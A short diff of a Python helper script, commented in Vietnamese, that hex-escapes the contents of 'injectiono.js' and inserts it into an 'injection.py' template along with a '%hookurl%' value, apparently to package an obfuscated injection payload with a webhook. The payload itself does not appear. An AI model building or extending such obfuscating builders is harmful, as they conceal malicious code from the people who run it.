@@ -1,5 +1,6 @@
 def string_to_hex(content):
-    return ''.join(f'\\x{c:02x}' for c in content)
+    contentt = ''.join(f'\\x{c:02x}' for c in content)
+    return contentt.encode('utf-8')
 
 with open('injectiono.js', 'rb') as file:
     content = file.read()
@@ -8,10 +9,12 @@ with open('injection.py', 'rb') as file:
     contentinj = file.read()
 
 hex_content = string_to_hex(content)
-contentinj = contentinj.replace("%code%", hex_content).replace("%hookurl%", string_to_hex(""))
+hook_url = string_to_hex("")
 
-# Ghi chuỗi hex vào một tệp mới
-with open('injection-o.py', 'w') as output_file:
-    output_file.write(hex_content)
+contentinj = contentinj.replace(b"%code%", hex_content).replace(b"%hookurl%", hook_url)
 
-print("Chuỗi hex đã được ghi vào tệp injection-o.js")
+# Ghi nội dung đã thay thế vào tệp mới
+with open('injection-o.py', 'wb') as output_file:
+    output_file.write(contentinj)
+
+print("Nội dung đã được ghi vào tệp injection-o.py")
